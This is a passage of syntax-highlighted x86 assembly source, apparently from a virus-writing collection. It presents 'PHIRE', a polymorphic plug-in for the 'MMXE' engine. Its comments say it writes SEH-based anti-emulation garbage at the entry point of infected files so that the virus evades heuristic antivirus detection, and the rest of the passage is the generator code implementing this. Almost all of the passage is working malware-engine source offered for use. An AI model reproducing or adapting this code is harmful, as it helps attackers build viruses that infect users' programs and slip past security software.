    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; EAX = a handler stored in</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">C4VH_Successful</span><span class="sc0">                 </span><span class="sc1">; table</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; Increase counter</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">C4VH_l00p</span><span class="sc0">
</span><span class="sc5">C4VH_Successful</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; EAX = WFD Offset</span><span class="sc0">

    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">C4VH_Error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; =:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=</span><span class="sc0">
</span><span class="sc1">; [PHIRE] - Polymorphic Header Idiot Random Engine v1.00     ³ MMXE plug-in ³</span><span class="sc0">
</span><span class="sc1">; =:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is a  plug-in for MMXE v1.01, that is  able to generate  a polymorphic</span><span class="sc0">
</span><span class="sc1">; block of code (size defined by user) captable to  kill emulators  and  hide</span><span class="sc0">
</span><span class="sc1">; the real entrypoint from AV. This is an EPO  plug-in for my MMXE. Why i say</span><span class="sc0">
</span><span class="sc1">; it's a plug-in? Well, it  wouldn't work without  MMXE, and it adds features</span><span class="sc0">
</span><span class="sc1">; to that engine that it previously haven't. So, don't doubt it: it's a plug-</span><span class="sc0">
</span><span class="sc1">; in ;)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; PHIRE will generate some code like the following:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       [...]</span><span class="sc0">
</span><span class="sc1">;       CALL    @@1</span><span class="sc0">
</span><span class="sc1">;       [...]</span><span class="sc0">
</span><span class="sc1">;       MOV     ESP,[ESP+08h]</span><span class="sc0">
</span><span class="sc1">;       [...]</span><span class="sc0">
</span><span class="sc1">;       POP     DWORD PTR FS:[0000h]</span><span class="sc0">
</span><span class="sc1">;       [...]</span><span class="sc0">
</span><span class="sc1">;       ADD     ESP,4</span><span class="sc0">
</span><span class="sc1">;       [...]</span><span class="sc0">
</span><span class="sc1">;       JMP     MMXE_DECRYPTOR</span><span class="sc0">
</span><span class="sc1">;       [...]</span><span class="sc0">
</span><span class="sc1">;  @@1: PUSH    DWORD PTR FS:[0000h]</span><span class="sc0">
</span><span class="sc1">;       [...]</span><span class="sc0">
</span><span class="sc1">;       MOV     DWORD PTR FS:[0000h],ESP</span><span class="sc0">
</span><span class="sc1">;       [...]</span><span class="sc0">
</span><span class="sc1">;       * -&gt; From here until complete the 256 bytes of code, we'll fill this</span><span class="sc0">
</span><span class="sc1">;            with random data, so an exception will surely happen :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Each '[...]' means garbage code. This will be placed at the original entry-</span><span class="sc0">
</span><span class="sc1">; point of the infected file, and  stops all  the actual  emulators. So, this</span><span class="sc0">
</span><span class="sc1">; plug-in makes the virus to be undetectable heuristically.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EDI = Buffer where put the generated polymorphic code</span><span class="sc0">
</span><span class="sc1">;       EAX = Distance between host entry-point and virus entry-point</span><span class="sc0">
</span><span class="sc1">;       EBP = Delta Offset</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       Nothing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       All registers are preserved.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">pLIMIT</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">phire</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_decrypt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">eBlock12</span><span class="sc4">-</span><span class="sc5">Block12</span><span class="sc0">

</span><span class="sc5">Block12</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@p_buffer</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@p_distance</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Clear work area</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">pLIMIT</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_key</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">   </span><span class="sc1">; Clear all registers :)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@clear_mask</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@init_mmx?</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">; Don't allow MMX garbage</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">                         </span><span class="sc1">; Write the provisional call</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@p_tmp_call</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@@s_stack_fix</span><span class="sc0">               </span><span class="sc1">; Generate some similar code</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">                         </span><span class="sc1">; to MOV ESP,[ESP+08h]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@stack_fix</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">      

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@@s_seh_restore</span><span class="sc0">             </span><span class="sc1">; Generate some similar code</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">                         </span><span class="sc1">; to POP FS:[0000h]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@seh_restore</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">      

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@@s_stack_fix_nh</span><span class="sc0">            </span><span class="sc1">; Generate some similar code</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">                         </span><span class="sc1">; to ADD ESP,4</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@stack_fix_nh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@jump_to_decryptor</span><span class="sc0">             </span><span class="sc1">; Generate the jump to the</span><span class="sc0">
                        </span><span class="sc1">; decryptor</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; Call after SEH handler</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@p_tmp_call</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@@s_seh_saveold</span><span class="sc0">             </span><span class="sc1">; Generate some similar code</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">                         </span><span class="sc1">; to PUSH FS:[0000h]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@seh_save_old</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">      

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@@s_seh_newhnd</span><span class="sc0">              </span><span class="sc1">; Generate some similar code</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">                         </span><span class="sc1">; to MOV FS:[0000h],ESP</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@seh_newhnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">      

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">pLIMIT</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@p_buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@fill_l00p</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@fill_l00p</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc3">"[PHIRE v1.00]"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">@@choose_aux1_reg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@choose_aux1_reg</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_ESP</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@choose_aux1_reg</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@choose_aux1_reg</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@choose_aux2_reg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@choose_aux2_reg</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_ESP</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@choose_aux2_reg</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@choose_aux2_reg</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Generate the jump to the MMXE decryptor</span><span class="sc0">

</span><span class="sc5">@@jump_to_decryptor</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@p_buffer</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@p_distance</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---</span><span class="sc0">

</span><span class="sc1">; Fixing stack after fault - type 1:</span><span class="sc0">
</span><span class="sc1">;       MOV     ESP,[ESP+08h]</span><span class="sc0">

</span><span class="sc5">@@stack_fix_type1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0824648Bh</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Fixing stack after fault - type 2:</span><span class="sc0">
</span><span class="sc1">;       MOV     REG,ESP</span><span class="sc0">
</span><span class="sc1">;       MOV     ESP,[REG+08h]</span><span class="sc0">

</span><span class="sc5">@@stack_fix_type2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08Bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@choose_aux1_reg</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000100b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">608Bh</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Fixing stack after fault - type 3:</span><span class="sc0">
</span><span class="sc1">;       MOV     REG,[ESP+08h]</span><span class="sc0">
</span><span class="sc1">;       MOV     ESP,REG</span><span class="sc0">

</span><span class="sc5">@@stack_fix_type3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@choose_aux1_reg</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01000100b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0824h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08Bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11100000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Fixing stack after fault - type 4:</span><span class="sc0">
</span><span class="sc1">;       MOV     REG1,ESP</span><span class="sc0">
</span><span class="sc1">;       MOV     REG2,[REG1+08h]</span><span class="sc0">
</span><span class="sc1">;       MOV     ESP,REG2</span><span class="sc0">

</span><span class="sc5">@@stack_fix_type4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08Bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@choose_aux1_reg</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000100b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@choose_aux2_reg</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">408Bh</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux2</span><span class="sc4">]</span><span class="sc0">
